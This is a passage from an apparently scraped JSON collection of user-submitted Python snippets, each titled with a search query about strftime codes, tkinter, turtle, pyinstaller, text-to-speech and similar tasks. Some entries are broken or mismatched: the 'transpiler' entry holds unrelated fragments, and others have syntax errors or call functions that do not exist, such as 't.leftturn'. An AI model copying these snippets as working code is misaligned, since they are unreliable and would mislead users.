zero-padded decimal number.                         | 01, 02, ..., 12         |  |%-m        | Month as a decimal number.                                     | 1, 2, ..., 12           |  |%y         | Year without century as a zero-padded decimal number.          | 00, 01, ..., 99         |  |%-y        | Year without century as a decimal number.                      | 0, 1, ..., 99           |  |%Y         | Year with century as a decimal number.                         | 2013, 2019 etc.         |  |%H         | Hour (24-hour clock) as a zero-padded decimal number.          | 00, 01, ..., 23         |  |%-H        | Hour (24-hour clock) as a decimal number.                      | 0, 1, ..., 23           |  |%I         | Hour (12-hour clock) as a zero-padded decimal number.          | 01, 02, ..., 12         |  |%-I        | Hour (12-hour clock) as a decimal number.                      | 1, 2, ... 12            |  |%p         | Locale&rsquo;s AM or PM.                                             | AM, PM                  |  |%M         | Minute as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-M        | Minute as a decimal number.                                    | 0, 1, ..., 59           |  |%S         | Second as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-S        | Second as a decimal number.                                    | 0, 1, ..., 59           |  |%f         | Microsecond as a decimal number, zero-padded on the left.      | 000000 - 999999         |  |%z         | UTC offset in the form +HHMM or -HHMM.                         |                         |  |%Z         | Time zone name.                                                |                         |  |%j         | Day of the year as a zero-padded decimal number.               | 001, 002, ..., 366      |  |%-j        | Day of the year as a decimal number. 1, 2, ..., 366            |                         |  |%U         | Week number of the year (Sunday as the first day of the week). | 00, 01, ..., 53         |  |%W         | Week number of the year (Monday as the first day of the week). | 00, 01, ..., 53         |  |%c         | Locale&rsquo;s appropriate date and time representation.             | Mon Sep 30 07:06:05 2013| |%x         | Locale&rsquo;s appropriate date representation.                      | 09/30/13                |  |%X         | Locale&rsquo;s appropriate time representation.                      | 07:06:05                |  |%%         | A literal '%' character.                                       | %                       |  \n%a - Abbreviated weekday name. (Sun, Mon, ...) %A - Full weekday name. (Sunday, Monday, ...) %w - Weekday as a decimal number. (0, 1, ..., 6) %d - Day of the month as a zero-padded decimal. (01, 02, ..., 31) %-d - Day of the month as a decimal number. (1, 2, ..., 30) %b - Abbreviated month name. (Jan, Feb, ..., Dec) %B - Full month name. (January, February, ...) %m - Month as a zero-padded decimal number. (01, 02, ..., 12) %-m - Month as a decimal number. (1, 2, ..., 12) %y - Year without century as a zero-padded decimal number. (00, 01, ..., 99) %-y - Year without century as a decimal number. (0, 1, ..., 99) %Y - Year with century as a decimal number. (2013, 2019 etc.) %H - Hour (24-hour clock) as a zero-padded decimal number. (00, 01, ..., 23) %-H - Hour (24-hour clock) as a decimal number. (0, 1, ..., 23) %I - Hour (12-hour clock) as a zero-padded decimal number. (01, 02, ..., 12) %-I - Hour (12-hour clock) as a decimal number. (1, 2, ... 12) %p - Locale&rsquo;s AM or PM. (AM, PM) %M - Minute as a zero-padded decimal number. (00, 01, ..., 59) %-M - Minute as a decimal number. (0, 1, ..., 59) %S - Second as a zero-padded decimal number. (00, 01, ..., 59) %-S - Second as a decimal number. (0, 1, ..., 59) %f - Microsecond as a decimal number, zero-padded on the left.  (000000 - 999999) %z - UTC offset in the form +HHMM or -HHMM.   %Z - Time zone name.  %j - Day of the year as a zero-padded decimal number. (001, 002, ..., 366) %-j - Day of the year as a decimal number. (1, 2, ..., 366) %U - Week number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0. (00, 01, ..., 53) %W - Week number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0. (00, 01, ..., 53) %c - Locale&rsquo;s appropriate date and time representation. (Mon Sep 30 07:06:05 2013) %x - Locale&rsquo;s appropriate date representation. (09/30/13) %X - Locale&rsquo;s appropriate time representation. (07:06:05) %% - A literal '%' character. (%)\n from datetime import datetime  timestamp = 1528797322 date_time = datetime.fromtimestamp(timestamp)  print(\"Date time object:\", date_time)  d = date_time.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"Output 2:\", d)\t  d = date_time.strftime(\"%d %b, %Y\") print(\"Output 3:\", d)  d = date_time.strftime(\"%d %B, %Y\") print(\"Output 4:\", d)  d = date_time.strftime(\"%I%p\") print(\"Output 5:\", d) \n from datetime import datetime  now = datetime.now() # current date and time  year = now.strftime(\"%Y\") print(\"year:\", year)  month = now.strftime(\"%m\") print(\"month:\", month)  day = now.strftime(\"%d\") print(\"day:\", day)  time = now.strftime(\"%H:%M:%S\") print(\"time:\", time)  date_time = now.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\t \nFormat time python\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3947,
    "keyword": null,
    "link": null,
    "title": " python time now other timezone",
    "description": "#as an aware datetime from datetime import datetime, timezone  utc_dt = datetime.now(timezone.utc) # UTC time dt = utc_dt.astimezone() # local time   #or from pytz database import pytz  tz = pytz.timezone('Europe/Berlin') berlin_now = datetime.now(tz)\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3948,
    "keyword": null,
    "link": null,
    "title": " python timestamp shift one day",
    "description": "from datetime import datetime, timedelta print datetime.now() + timedelta(days=5, hours=-5)\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3949,
    "keyword": null,
    "link": null,
    "title": " python title case",
    "description": "string = 'this will be title case' print(string.title()) #output: 'This Will Be Title Case'\nimport re def titlecase(s):      return re.sub(r\"[A-Za-z]+('[A-Za-z]+)?\",                    lambda mo: mo.group(0).capitalize(),                    s) \nCopy Code# Python code to explain title() Method  # Initialize a string with all lowercase characters str1 = 'python code to explain title method' # Initialize a string with a first uppercase character str2 = 'Python Code to Explain Title Method' # Initialize a string with all uppercase character str3 = 'PYTHON CODE TO EXPLAIN TITLE METHOD' # Initialize a string with a first numeric character str4 = '1python 2code to 2explain title method' # Pass strings with title() method TitleStr1 = str1.title() TitleStr2 = str2.title() TitleStr3 = str3.title() TitleStr4 = str4.title() # Print output print('String 1: ', str1, ' New 1: ',TitleStr1) print('String 2: ', str2, ' New 2: ',TitleStr2) print('String 3: ', str3, ' New 3: ',TitleStr3) print('String 4: ', str4, ' New 4: ',TitleStr4)\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3950,
    "keyword": null,
    "link": null,
    "title": " python tkinter clear textbox",
    "description": "tex.delete('1.0', END) \n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3951,
    "keyword": null,
    "link": null,
    "title": " python tkinter close gui window",
    "description": "from tkinter import * root=tk.Tk() root.destroy()\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3952,
    "keyword": null,
    "link": null,
    "title": " python tkinter disable dropdown",
    "description": "example = Checkbutton(root)  # \"disable\" or \"active\" example.configure(state=\"disabled\")\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3953,
    "keyword": null,
    "link": null,
    "title": " python tkinter filedialog",
    "description": "from tkinter import filedialog  \t\t\t\t\t\t# Where it open to.\t\t\t\t\t# What the window is called.\t# What file types the user can choose between. first one is the defualt. ((\"what ever\", \"*.format\"), (\"what ever 2\", \"*.format2\")) filedialog.askopenfilename(initialdir=os.path.normpath(\"C://\"), title=\"Example\", filetypes =((\"PNG\", \"*.png\"),(\"JPG\", \"*.jpg\"),(\"All Files\",\"*.*\")))\nfrom tkinter import filedialog  \t\t\t\t\t\t\t\t# Where it open to.\t\t\t\t\t# What the window is called. folder = filedialog.askdirectory(initialdir=os.path.normpath(\"C://\"), title=\"Example\")\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3954,
    "keyword": null,
    "link": null,
    "title": " python tkinter filedialog folder",
    "description": "from tkinter import filedialog  \t\t\t\t\t\t\t\t# Where it open to.\t\t\t\t\t# What the window is called. folder = filedialog.askdirectory(initialdir=os.path.normpath(\"C://\"), title=\"Example\")\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3955,
    "keyword": null,
    "link": null,
    "title": " python tkinter font",
    "description": "import tkinter from tkinter.font import Font  root = tkinter.Tk()  font_1 = Font(family='Arial',                size=24,                weight='normal',                slant='italic',                underline=1,                overstrike=1)  font_2 = Font(family='Helvetica',               size=12,               weight='bold',               slant='italic',               underline=0,               overstrike=0)  font_3 = Font(family='Courier', size=14, weight='normal', slant='roman', underline=0, overstrike=0) font_4 = Font(family='Times', size=22, weight='bold', slant='roman', underline=0, overstrike=0)  my_label = tkinter.Label(master=root, text='Text', font=font_1) my_label.pack()  tkinter.mainloop()\nimport tkinter.font as TkFont  font = tkFont.Font ( option, ... ) # Exaple helv36 = tkFont.Font(family=\"Helvetica\",size=36,weight=\"bold\")\n",
    "reg_date": "2021-10-12T11:34:19.000Z"
  },
  {
    "id": 3956,
    "keyword": null,
    "link": null,
    "title": " python tkinter get value of checkbox",
    "description": "from tkinter import *  root = Tk()  value = IntVar()  example = Checkbutton(root, variable=value) example.pack()  # 1 = clicked # 0 = not clicked print(value.get())  root.mainloop()\nexample = Checkbutton(root) example.grid(row=0, column=0) example.select()\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3957,
    "keyword": null,
    "link": null,
    "title": " python tkinter go to another window on button click",
    "description": "# Function to make new window def openNewWindow():   newWindow = Toplevel(root)   newWindow.title(\"New page\")   newWindow.geometry(\"700x400\")  button = Button(root, text=\"Click me\", command=openNewWindow) button.pack()\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3958,
    "keyword": null,
    "link": null,
    "title": " python tkinter image",
    "description": "import tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path\\\\to\\\\imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\nfrom tkinter import *       root = Tk()       canvas = Canvas(root, width = 300, height = 300)       canvas.pack()       img = PhotoImage(file=\"ball.ppm\")       canvas.create_image(20,20, anchor=NW, image=img)       mainloop() \nimport tkinter as tk window = tk() canvas = Canvas(window, width=300, height=300) image = PhotoImage('path') canvas.create_image(height=40, width=40, img=image) \n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3959,
    "keyword": null,
    "link": null,
    "title": " python tkinter lable on bottom of screen",
    "description": "example = Button(credit, text=\"example\") example.place(relx=1.0, rely=1.0, anchor=\"se\")\nimport tkinter as tk      # Creating the root window  root = tk.Tk()     # creating the Label with  # the text Middle  Label_middle = tk.Label(root,                           text ='Middle')     # Placing the Label at   # the middle of the root window  # relx and rely should be properly  # set to position the label on  # root window  Label_middle.place(relx = 0.5,                      rely = 0.5,                     anchor = 'center')     root.mainloop()\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3960,
    "keyword": null,
    "link": null,
    "title": " python tkinter listbox click event",
    "description": "main = Tk()  def clickEvent:   #insert code that will execute here    lb = Listbox(main) lb.bind('<<ListboxSelect>>', clickEvent)\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3961,
    "keyword": null,
    "link": null,
    "title": " python tkinter messagebox",
    "description": "import tkinter from tkinter import messagebox # hide main window root = tkinter.Tk() # message box display messagebox.showerror(\"Error\", \"Error message\") messagebox.showwarning(\"Warning\",\"Warning message\") messagebox.showinfo(\"Information\",\"Informative message\")\nimport tkinter as tk from tkinter import messagebox as mb  def answer():     mb.showerror(\"Answer\", \"Sorry, no answer available\")  def callback():     if mb.askyesno('Verify', 'Really quit?'):         mb.showwarning('Yes', 'Not yet implemented')     else:         mb.showinfo('No', 'Quit has been cancelled')  tk.Button(text='Quit', command=callback).pack(fill=tk.X) tk.Button(text='Answer', command=answer).pack(fill=tk.X) tk.mainloop() \nfrom tkinter import messagebox  messagebox.showinfo('Title', 'Information')\nimport Tkinter import tkMessageBox  top = Tkinter.Tk() def hello():    tkMessageBox.showinfo(\"Say Hello\", \"Hello World\")  B1 = Tkinter.Button(top, text = \"Say Hello\", command = hello) B1.pack()  top.mainloop()\nfrom tkinter import * from tkinter import messagebox  def listMessageBox(arr):   window=Tk()   listbox=Listbox(window)   listbox.pack(fill=BOTH, expand=1) #adds listbox to window   [listbox.insert(END, row) for row in arr] #one line for loop   window.mainloop()    arr=['a','b','c','1','2','3']  listMessageBox(arr)\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3962,
    "keyword": null,
    "link": null,
    "title": " python tkinter resize window on button click",
    "description": "from tkinter import *  root = Tk() root.title(\"Title\") root.geometry(\"800x800\")  # Resize on button click def resize():   root.geometry(\"500x500\")  button_1 = Button(root, text=\"Resize\", command=resize) button_1.pack(pady=20)  # Resize by parameters def resize2():   w = 650   h = 650   root.geometry(f\"{w}x{h}\")  button_2 = Button(root, text=\"Resize\", command=resize2) button_2.pack(pady=20)  # Resize by user entered parameters def resize3():   w = width_entry.get()   h = height_entry.get()   root.geometry(f\"{w}x{h}\")  width_label = Label(root, text=\"Width:\") width_label.pack(pady=20) width_entry = Entry(root) width_entry.pack()  height_label = Label(root, text=\"Height:\") height_label.pack(pady=20) height_entry = Entry(root) height_entry.pack()  button_3 = Button(root, text=\"Resize\", command=resize3) button_3.pack(pady=20)  root.mainloop()\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3963,
    "keyword": null,
    "link": null,
    "title": " python tkinter save entry data in txt file",
    "description": "# Save data from entry widget to a text file: from tkinter import *  def save_data():   name_info = name.get()    f = open(\"text_file.txt\", \"w\")   f.write(name_info + \"\\n\")   f.close()  root = Tk()  name = StringVar()  Entry(root, textvariable=name).pack()  Button(root, text='Save Data', command=lambda:save_data()).pack()  root.mainloop()\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3964,
    "keyword": null,
    "link": null,
    "title": " python tkinter set minimum window size",
    "description": "# Change window_name to the name of the window object, i.e. root window_name.geometry(\"500x500\") # To ensure widgets resize: widget_name.pack(fill=\"both\", expand=True)\n# Set min window size root = Tk() root.minsize(500, 500)\nwindow = Tk() #set window size window.geometry(\"widthxheight\")\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3965,
    "keyword": null,
    "link": null,
    "title": " python tkinter underline text",
    "description": "example = Label(root, text=\"example\", font=('Arial',9,'underline')) example.pack()\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3966,
    "keyword": null,
    "link": null,
    "title": " python tkinter window fullscreen",
    "description": "import tkinter as tk root = tk.Tk()  root.attributes('-fullscreen',True)\n",
    "reg_date": "2021-10-12T11:34:20.000Z"
  },
  {
    "id": 3967,
    "keyword": null,
    "link": null,
    "title": " python to c++ transpiler",
    "description": "# Note: The last time I tested something was missing so I couldn't work import pathlib import transpyle  path = pathlib.Path('my_script.py') code_reader = transpyle.CodeReader() code = code_reader.read_file(path)  from_language = transpyle.Language.find('Python 3.6') to_language = transpyle.Language.find('Fortran 95') translator = transpyle.AutoTranslator(from_language, to_language) fortran_code = translator.translate(code, path) print(fortran_code) \na = input () b = input () if a % b == 0: \tprint (a, 'и', b, 'делится без остатка') else: \tprint (a, 'и', b, 'делится с остатком')\n#is_Sorted method  def is_Sorted(li):    #for loop will iterate len(li)-1 times    for i in range(len(li) - 1):        #if li[i] > li[i+1]        if(li[i] > li[i+1]):            #return False            return False    #return True    return True  #initializing array list1 = [16.1, 12.3, 22.2, 14.4] #initializing array list2 = [1.5, 4.3, 7.0, 19.5, 25.1, 46.2] #calling is_Sorted method is_Sorted(list1) #calling is_Sorted method is_Sorted(list2)\ndef __init__(self, n, connections):     self.servers = set()     for a, b, c in connections:         self.servers.add(a)         self.servers.add(b)     self.parents = {x: x for x in self.servers}     self.ranks = {x: 1 for x in self.servers}  def find(self, u):     if u != self.parents[u]:         self.parents[u] = self.find(self.parents[u])     return self.parents[u]  def union(self, u, v):     p1, p2 = self.find(u), self.find(v)     if p1 == p2:         return False     if self.ranks[p2] > self.ranks[p1]:         p1, p2 = p2, p1     self.parents[p2] = p1     self.ranks[p1] += self.ranks[p2]     return True class Solution:  def connect(self, num, connection):     connection.sort(key = lambda x : x[2])     uf = UnionFind(num, connection)     min_cost = 0     res = []     for server1, server2, cost in connection:         if uf.union(server1, server2):             res.append([server1,server2,cost])     return res\nask=int(input())  print((abs(ask)+10-(int(abs(ask)\u0010))+(int(abs(ask)/ask)-1)*5)*int(abs(ask)/ask))\ndef out_write(lst):     for k in range(len(lst)):         if len(lst[k])>0:             # out.write(\"\\n\")             for i in lst[k]:                 out.write(str(k+2)+' ')                 for j in i:                     out.write(str(j)+' ')                 out.write(\"\\n\")  f=open(\"e_many_teams.in\",'r') open(\"e_many_teams.out\",\"w\").close() out=open(\"e_many_teams.out\",'a')  l=[] base=[] ingredients=set() pizza_list_distinct={} for i in f.readlines():     t=i[:len(i)]     pizza=t.split()     if len(l)==0:         base=pizza.copy()     l.append(pizza) length=len(l) del l[0]  for i in range (len(l)):     pizza_list_distinct[i]=set(l[i][1:])   for j in range(len(base)):     base[j]=int(base[j]) total_pizzas=base[0] total_participants=(base[1]*2)+(base[2]*3)+(base[3]*4) diff=total_participants-total_pizzas if diff<0:     diff=total_participants  t2=[] t3=[] t4=[]   counter=diff if total_participants>total_pizzas:     while diff>0:         if diff>=4 and base[3]>0:             base[3]-=1             diff-=4         elif diff>=3 and base[2]>0:             base[2]-=1             diff-=3         elif diff>=1 and base[1]>0:             base[1]-=1             diff-=2  counter=base[1]*2+base[2]*3+base[3]*4  count=0 counter1=counter  all_pizzas=[] for j in l:     t=set(j[1:])     all_pizzas.append(t)   while counter>0:     if base[3]>0:         temp=set()         i=1         val=[]         while len(val)!=4:             for key,value in pizza_list_distinct.items() :                 if len(val)==0:                     if all_pizzas[0]==value:                         temp=temp.union(pizza_list_distinct[key])                         val.append(key)                         del pizza_list_distinct[key]                         del all_pizzas[0]                         counter-=1                         break                 else:                     if len(temp.union(value)) >= (len(temp) + len(value) -1):                         temp=temp.union(pizza_list_distinct[key])                         val.append(key)                         del pizza_list_distinct[key]                         all_pizzas.remove(value)                         counter-=1                         break         base[3]-=1         t4.append(val)         val=[]      if base[2]>0:         temp=set()         i=1         val=[]         while len(val)!=3:             for key,value in pizza_list_distinct.items() :                 if len(val)==0:                     if all_pizzas[0]==value:                         temp=temp.union(pizza_list_distinct[key])                         val.append(key)                         del pizza_list_distinct[key]                         del all_pizzas[0]                         counter-=1                         break                 else:                     if len(temp.union(value)) >= (len(temp) + len(value) -1):                         temp=temp.union(pizza_list_distinct[key])                         val.append(key)                         del pizza_list_distinct[key]                         all_pizzas.remove(value)                         counter-=1                         break         base[2]-=1         t3.append(val)         val=[]      if base[1]>0:         temp=set()         i=1         val=[]         while len(val)!=2:             for key,value in pizza_list_distinct.items() :                 if len(val)==0:                     if all_pizzas[0]==value:                         temp=temp.union(pizza_list_distinct[key])                         val.append(key)                         del pizza_list_distinct[key]                         del all_pizzas[0]                         counter-=1                         break                 else:                     if len(temp.union(value)) >= (len(temp) + len(value) -1):                         temp=temp.union(pizza_list_distinct[key])                         val.append(key)                         del pizza_list_distinct[key]                         all_pizzas.remove(value)                         counter-=1                         break         base[1]-=1         t2.append(val)         val=[]          else:         continue  count=(len(t2)+len(t3)+len(t4))  output=[t2,t3,t4] out.write(str(count)) out.write(\"\\n\") out_write(output)\ndef isEven(number):            if number%2==0:     node 4         print(f'{number} is even')     else:                            node 5         print(f'{number} is odd')  def isPrime(number):     if number > 1:      node 6         for i in range(2,number):               if (number % i) == 0:                   print(number,\"is not a prime number\")                   print(i,\"times\",number//i,\"is\",number)                   break               else:            node 7                 print(number,\"is a prime number\") node 8                 break     else:           print(number,\"is not a prime number\")   print('Please enter a number between 1-10') number = int(input())                           node 1 print('Which operation you want to perform?') print('1- Check if Even or ODD \\n2- Check if Prime\\n') choice = int(input()) if choice == 1:          node 2     isEven(number) if choice == 2:         node 3     isPrime(number) \nimport math  def isPrime(x):     if x < 2:         return(False)     if x == 2:         return(True)     cap = int(math.sqrt(x)) + 1     for i in range(2, cap):         if x % i == 0:             return(False)      return(True)  def contain(x, y):     while (x>0):         if x % 10 == y:             return(True)         x = x // 10     return(False)  a, b, d = [int(x) for x in input().split()]  count = 0  for i in range(a, b+1):     if isPrime(i):         if contain(i, d):             count += 1  print(count)\n#to use PI and import all decimal methods import math from decimal import * \nfrom mpi4py import MPI from scipy import misc import numpy as np import math comm = MPI.COMM_WORLD size = comm.Get_size() rank = comm.Get_rank()   newImage = [] kernel = np.array([     [0, -1, 0],     [-1, 4, -1],     [0, -1, 0] ]) def multiplication(FinalImage):     for i in range(start + 1, end + 1):         inner_arr = []         for j in range(1, width + 1):             val= FinalImage[i - 1, j - 1] * kernel[0, 0] + FinalImage[i - 1, j] * kernel[0, 1] + \\                     FinalImage[i - 1, j + 1] * kernel[0, 2]             val+= FinalImage[i, j - 1] * kernel[1, 0] + FinalImage[i, j] * kernel[1, 1] + FinalImage[                 i, j + 1] * kernel[1, 2]              val+= FinalImage[i + 1, j - 1] * kernel[2, 0] + FinalImage[i + 1, j] * kernel[2, 1] + \\                      FinalImage[i + 1, j + 1] * kernel[2, 2]             inner_arr.append(val)         newImage.append(inner_arr)  if rank == 0:       image= misc.imread('nn.png')       num_OF_rows= image.shape[0]       num_OF_columns= image.shape[1]        for i in range (size-1):           comm.send([num_OF_rows, num_OF_columns], dest=i+1 , tag=1)        # tag 2 for gray scale       GrayImage= []       for i in range (size-1):          comm.send(image , dest=i+1 , tag=2)        for i in range (size-1):           GrayImage+= comm.recv(source=i+1 , tag=2)        misc.imsave(\"grayImage.png\", GrayImage)          # padding       Paded_image= np.zeros((num_OF_rows + 2, num_OF_columns + 2))       Paded_image[1:num_OF_rows + 1, 1:num_OF_columns + 1] = image[0:num_OF_rows  ,0:num_OF_columns, 0]          # tag 3 for HPF       for i in range ( size-1):           comm.send(Paded_image, dest=i+1, tag=3)        HPF_image= []       for i in range (size-1):           HPF_image+= comm.recv(source=i+1, tag=3)        misc.imsave(\"output.png\", HPF_image)       print(\"OUTPUT IS DONE\")   else:       Image_dimensions= comm.recv(source=0, tag=1)       height= Image_dimensions[0]       width= Image_dimensions[1]        num_rows= math.ceil(height / (size - 1))       start= (num_rows * (rank - 1))       end= start + num_rows        #end of the image reached       if end > height:          end= height         Colored_image = comm.recv(source=0, tag=2)        #GRAY STEP       new_img= []       for i in range(start, end):           inner_arr= []           for j in range(width):               value= Colored_image[i,j,0]               inner_arr.append(value)           new_img.append(inner_arr)       comm.send(new_img, dest=0, tag=2)        FinalImage= comm.recv(source=0, tag=3)        multiplication(FinalImage)        # Result       new_img= []       for i in range(len(newImage)):         inner_arr= []         for j in range(len(newImage[0])):             #ideal_highpass(highpass+domainsample)             #value=math.sqrt((newImage[i][j])*(newImage[i][j]))             #highpass             value = (newImage[i][j])             inner_arr.append(value)         new_img.append(inner_arr)       comm.send(new_img, dest=0, tag=3)\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3968,
    "keyword": null,
    "link": null,
    "title": " python to exe",
    "description": "auto-py-to-exe\n#if you dont have pyinstaller so run the cmd (winkey + r and write cmd and enter) #now run the command bellow  \tpip install pyinstaller      #now run this  \tpyinstaller -w file_name.pyw     #if you want the exe to be in one file without other folders      #change the code to: pyinstaller -w --onefile file_name.pyw           #change file_name to your file's name and if you aren't running the cmd in the #same directory so instead of the file's name write the all path #now you will have a directory named Build and in it you will find your exe file #note - if your pyw filw has dependents so they will be in the file so dont remove them\npip install pyinstaller  cd FullPathOfFile in cmd console pyinstaller --onefile pythonScriptName.py # a .exe file is created in the FullPathOfFile\\dist\npyinstaller --version\nInstall pip using \tpip install pyinstaller  in the directory of the source code file run \tpyinstaller <file_name>.py\n$ pyinstaller cli.py --onefile \n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3969,
    "keyword": null,
    "link": null,
    "title": " python toast notification",
    "description": "# If win10toast is not installed on your machine open the command prompt and run # pip install win10toast # or # pip3 install win10toast from win10toast import ToastNotifier toaster = ToastNotifier() toaster.show_toast(\"Sample Notification\",\"Python is awesome!!!\")\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3970,
    "keyword": null,
    "link": null,
    "title": " python today - 1 day",
    "description": "from datetime import datetime, timedelta  yesterday = datetime.today() - timedelta(days = 1 )\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3971,
    "keyword": null,
    "link": null,
    "title": " python tomorrow",
    "description": "datetime.date.today() + datetime.timedelta(days=1)\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3972,
    "keyword": null,
    "link": null,
    "title": " python trace table generator",
    "description": "Using Trace Tables | www.101computing.net &rsaquo; \ncounter = 1 while counter < 11:     print(counter, end = &lsquo; &lsquo;)     counter=(counter + 1) \n6 8 11 15\nx=16 y=2 z=0 while z does not equal 6 :     x= sqrt (x)        #squrt = square root     y=y*y     z=z+2\ncounter = 1 while counter < 3:     print(counter, end = &lsquo; &lsquo;)     counter=(counter + 1) \n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3973,
    "keyword": null,
    "link": null,
    "title": " python transform two columns to a list combine",
    "description": "df[\"pair_var\"] = df[[\"var_1\", \"var_2\"]].values.tolist()\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3974,
    "keyword": null,
    "link": null,
    "title": " python translator",
    "description": "from translate import Translator translator= Translator(to_lang=\"German\") translation = translator.translate(\"Good Morning!\") print translation\npip install translate\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3975,
    "keyword": null,
    "link": null,
    "title": " python transpose list",
    "description": "list_of_lists = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]  numpy_array = np.array(list_of_lists) transpose = numpy_array.T  transpose_list = transpose.tolist()\n# Use numpy. T to transpose a list of lists, from kite.com  list_of_lists = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]  numpy_array = np.array(list_of_lists) transpose = numpy_array.T transpose `numpy_array`  transpose_list = transpose.tolist()\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3976,
    "keyword": null,
    "link": null,
    "title": " python try except empty",
    "description": "try:   print(\"I will try to print this line of code\") except:   pass\n",
    "reg_date": "2021-10-12T11:34:21.000Z"
  },
  {
    "id": 3977,
    "keyword": null,
    "link": null,
    "title": " python tts",
    "description": "from gtts import gTTS  # ask for text to speak text = input(\"enter text to speak: \")  # generate tts output = gTTS(text=text, lang=\"en\", tld=\"co.in\") output.save(f\"tts.mp3\") \nThe best library because you dont have to save the text file or open the file to start the speech  pip install pyttsx3  import pyttsx3 engine = pyttsx3.init() engine.say(\"Hello world\") engine.runAndWait()\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3978,
    "keyword": null,
    "link": null,
    "title": " python turn non printable character to escape string",
    "description": "text_to_print = repr(text_with_newlines_and_other_things) print(text_to_print)  # example >>> print(\"hi\\nthere\") hi there >>> print(repr(\"hi\\nthere\"))  'hi\\nthere'\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3979,
    "keyword": null,
    "link": null,
    "title": " python turtle import images",
    "description": "import turtle from os import path #WARNING: IMAGES MUST BE .GIF currentDir = os.abspath(path.curdir) #get the python file location  wn = turtle.Screen() wn.setup(width=700,height=400) wn.title(\"image test\")  wn.addshape(currentDir+\"\\\\Resources\\\\image.gif\") #u can make images in a new folder  myImage = turtle.Turtle() myImage.speed(0) #so it will draw the image instantly myImage.shape(currentDir+\"\\\\Resources\\\\image.gif\") #give your object the image myImage.penup() #if you dont do this, it will draw a line myImage.goto(0,0) #give your image a location  while True:   wn.update() #update your window\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3980,
    "keyword": null,
    "link": null,
    "title": " python turtle rotate",
    "description": "import turtle t = turtle.Turtle()  #Setting Rotation t.setheading(0) # This Faces Right t.setheading(180) # This Faces Left t.setheading(90) # This Faces Up t.setheading(270) # This Faces Down  ################################### # Values are measured in degrees # ###################################\nimport turtle t = turtle.Turtle()  # When using t.setheading(), angles start with 0 degrees, which points right. # It then goes anti-clockwise, with 90 degrees being up, 180 being left # and 270 degrees being down. 360 degrees is back at the start, and thus # is the same as 0 degrees. For Example: t.setheading(45) # Face the top-right # You can also use t.seth() t.seth(180) # Face leftwards  # If you want to rotate your turtle relative to its current position, # for example you want it to do a 90 degree left turn you can use # t.left() and t.right(). Positive values will turn the turtle however many # degrees in the direction of the function you're using, whereas negative values # would be the equivelent of using the opposite function: t.left(90) # Quarter-turn left t.right(-90) # Also quarter-turn left # You can also use the shorthand functions t.lt() and t.rt() t.lt(180) # Face the opposite direction to where the turtle is currently looking t.rt(180) # Does exactly the same thing  # If you want to use radians you can use the t.radians() function: t.radians() # this can be reverted by using: t.degrees()\nimport turtle t = turtle.Turtle()  #Changing Rotation t.leftturn(10) # Turns Left 10 Degrees t.rightturn(30) # Turns Right 30 Degrees  ############################################# # t.lt() and t.rt() are also abbreviations. # #############################################\n >>> tp = turtle.pos()  >>> tp  (0.00,0.00)  >>> turtle.setpos(60,30)  >>> turtle.pos()  (60.00,30.00)  >>> turtle.setpos((20,80))  >>> turtle.pos()  (20.00,80.00)  >>> turtle.setpos(tp)  >>> turtle.pos()  (0.00,0.00) \n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3981,
    "keyword": null,
    "link": null,
    "title": " python turtle shooting game",
    "description": "a=10 print(a) \npython turtle shooting game\n",
    "reg_date": "2021-10-12T11:34:22.000Z"
  },
  {
    "id": 3982,
    "keyword": null,
    "link": null,
    "title": " python turtle speed",
